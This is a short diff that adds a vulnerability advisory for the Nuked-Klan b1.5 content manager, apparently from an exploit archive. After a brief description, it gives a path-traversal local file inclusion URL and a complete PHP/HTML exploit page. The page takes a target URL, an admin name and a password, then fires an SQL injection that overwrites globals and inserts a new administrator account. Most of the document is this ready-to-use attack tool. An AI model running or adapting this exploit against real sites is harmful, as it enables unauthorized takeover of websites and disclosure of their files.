@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/10104/info
+
+Nuked-Klan is prone to multiple vulnerabilities. These issues include information disclosure via inclusion of local files, an issue that may permit remote attackers to corrupt configuration files and an SQL injection vulnerability.
+
+- To include a local file:
+
+http://www.example.com/index.php?user_langue=../../../../../file/to/view
+
+- Create admin (overwriting GLOBALS) :
+
+-------------------------------------------------------
+
+<html>
+<head>
+<title>Nuked-KlaN b1.5 Create Admin</title>
+</head>
+<body>
+<?
+function ascii_sql($str) {
+for ($i=0;$i < strlen($str);$i++) {
+if ($i == strlen($str)-1){
+$ascii_char.=ord(substr($str,$i));
+}else{
+$ascii_char.=ord(substr($str,$i)).',';
+}
+}
+return $ascii_char;
+}
+
+if (isset($_POST["submit"])){
+
+echo "<script>url='".$target."/index.php?
+file=Suggest&op=add_sug&user_langue=../globals.php&nuked[prefix]=nuked_users%20
+(id,pseudo,pass,niveau)%20VALUES%20(12345,char(".ascii_sql($_POST
+["pseudo"])."),md5(char(".ascii_sql($_POST
+["pass"]).")),9)/*&module=Gallery';window.open(url);</script>";
+echo "<br><br><br><br>Admin should have been created.";
+
+}else{
+?>
+
+<form method="POST" action="<? echo $PHP_SELF; ?>">
+<b>Target :</b> <input type="text" name="target" value="http://"><br>
+<b>Admin Nick :</b> <input type="text" name="pseudo"><br>
+<b>Admin Pass :</b> <input type="text" name="pass"><br>
+<input type="submit" name="submit" value="Create Admin">
+</form>
+<?
+}
+?>
+</body>
+</html>
+-------------------------------------------------------
